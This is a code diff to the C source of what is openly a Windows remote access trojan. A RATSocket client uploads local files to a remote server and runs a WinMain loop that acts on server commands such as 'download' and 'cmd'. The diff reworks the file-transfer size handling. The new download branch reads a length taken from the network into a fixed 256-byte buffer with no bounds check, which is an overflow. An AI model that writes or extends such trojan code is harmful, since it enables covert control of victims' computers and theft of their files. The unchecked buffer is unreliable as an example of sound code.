@@ -26,6 +26,7 @@ typedef BOOL _CloseHandle(HANDLE hObject);
 
 #define SOCKET_BUFFER_SIZE 256
 #define SPLIT_STRING_ARRAY_SIZE 16
+#define FILE_SIZE_DIGIT_SIZE 8
 #define UNLEN 256
 
 struct RATSocket
@@ -61,10 +62,10 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
 			if ( readSize > 0 )
 			{
-				char sizeToSend[8] = {};
-				_itoa_s((int)readSize, sizeToSend, 8, 10);
+				char sizeToSend[FILE_SIZE_DIGIT_SIZE] = {};
+				_itoa_s((int)readSize, sizeToSend, FILE_SIZE_DIGIT_SIZE, 10);
 				
-				SocketSend(ratSocket, sizeToSend, 8);
+				SocketSend(ratSocket, sizeToSend, FILE_SIZE_DIGIT_SIZE);
 				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
@@ -287,13 +288,29 @@ WinMain(HINSTANCE hInstance,
 		}
 		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
 		{
-			char writeBuffer[SOCKET_BUFFER_SIZE];
-			if ( f_recv(ratSocket.socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
+			char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE];
+			if ( f_recv(ratSocket.socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
 			{
-				OutputDebugStringA("Error receiving message.");
+				OutputDebugStringA("## File size: ");
+				OutputDebugStringA(fileSizeBuffer);
+				int fileSize = atoi(fileSizeBuffer);
+
+				char writeBuffer[SOCKET_BUFFER_SIZE];
+				
+				if ( f_recv(ratSocket.socketConnection, writeBuffer, fileSize, 0) != SOCKET_ERROR )
+				{
+					OutputDebugStringA("## Received download: ");
+					OutputDebugStringA(writeBuffer);
+				}
+				else
+				{
+					OutputDebugStringA("[ERROR] Error receiving download command from server.");
+				}
 			}
-			OutputDebugStringA("Received download: ");
-			OutputDebugStringA(writeBuffer);
+			else
+			{
+				OutputDebugStringA("[ERROR] Error receiving download file size from server.");
+			}
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
